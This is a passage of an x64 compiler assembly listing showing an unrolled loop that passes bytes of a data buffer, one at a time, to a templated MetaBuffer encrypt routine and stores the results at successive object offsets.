  00eae	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00eb2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00eb9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00ebe	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ec5	88 41 59	 mov	 BYTE PTR [rcx+89], al
  00ec8	b8 01 00 00 00	 mov	 eax, 1
  00ecd	48 6b c0 59	 imul	 rax, rax, 89		; 00000059H
  00ed1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00ed8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00edc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ee3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00ee8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00eef	88 41 5a	 mov	 BYTE PTR [rcx+90], al
  00ef2	b8 01 00 00 00	 mov	 eax, 1
  00ef7	48 6b c0 5a	 imul	 rax, rax, 90		; 0000005aH
  00efb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00f02	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00f06	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00f0d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00f12	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00f19	88 41 5b	 mov	 BYTE PTR [rcx+91], al
  00f1c	b8 01 00 00 00	 mov	 eax, 1
  00f21	48 6b c0 5b	 imul	 rax, rax, 91		; 0000005bH
  00f25	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00f2c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00f30	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00f37	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00f3c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00f43	88 41 5c	 mov	 BYTE PTR [rcx+92], al
  00f46	b8 01 00 00 00	 mov	 eax, 1
  00f4b	48 6b c0 5c	 imul	 rax, rax, 92		; 0000005cH
  00f4f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00f56	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00f5a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00f61	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00f66	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00f6d	88 41 5d	 mov	 BYTE PTR [rcx+93], al
  00f70	b8 01 00 00 00	 mov	 eax, 1
  00f75	48 6b c0 5d	 imul	 rax, rax, 93		; 0000005dH
  00f79	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00f80	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00f84	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00f8b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00f90	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00f97	88 41 5e	 mov	 BYTE PTR [rcx+94], al
  00f9a	b8 01 00 00 00	 mov	 eax, 1
  00f9f	48 6b c0 5e	 imul	 rax, rax, 94		; 0000005eH
  00fa3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00faa	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00fae	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00fb5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00fba	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00fc1	88 41 5f	 mov	 BYTE PTR [rcx+95], al
  00fc4	b8 01 00 00 00	 mov	 eax, 1
  00fc9	48 6b c0 5f	 imul	 rax, rax, 95		; 0000005fH
  00fcd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00fd4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00fd8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00fdf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  00fe4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00feb	88 41 60	 mov	 BYTE PTR [rcx+96], al
  00fee	b8 01 00 00 00	 mov	 eax, 1
  00ff3	48 6b c0 60	 imul	 rax, rax, 96		; 00000060H
  00ff7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00ffe	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  01002	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  01009	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0100e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  01015	88 41 61	 mov	 BYTE PTR [rcx+97], al
  01018	b8 01 00 00 00	 mov	 eax, 1
  0101d	48 6b c0 61	 imul	 rax, rax, 97		; 00000061H
  01021	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  01028	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0102c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  01033	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  01038	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0103f	88 41 62	 mov	 BYTE PTR [rcx+98], al
  01042	b8 01 00 00 00	 mov	 eax, 1
  01047	48 6b c0 62	 imul	 rax, rax, 98		; 00000062H
  0104b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  01052	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  01056	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0105d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  01062	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  01069	88 41 63	 mov	 BYTE PTR [rcx+99], al
  0106c	b8 01 00 00 00	 mov	 eax, 1
  01071	48 6b c0 63	 imul	 rax, rax, 99		; 00000063H
  01075	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0107c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  01080	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  01087	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0108c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  01093	88 41 64	 mov	 BYTE PTR [rcx+100], al
  01096	b8 01 00 00 00	 mov	 eax, 1
  0109b	48 6b c0 64	 imul	 rax, rax, 100		; 00000064H
  0109f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  010a6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  010aa	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  010b1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  010b6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  010bd	88 41 65	 mov	 BYTE PTR [rcx+101], al
  010c0	b8 01 00 00 00	 mov	 eax, 1
  010c5	48 6b c0 65	 imul	 rax, rax, 101		; 00000065H
  010c9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
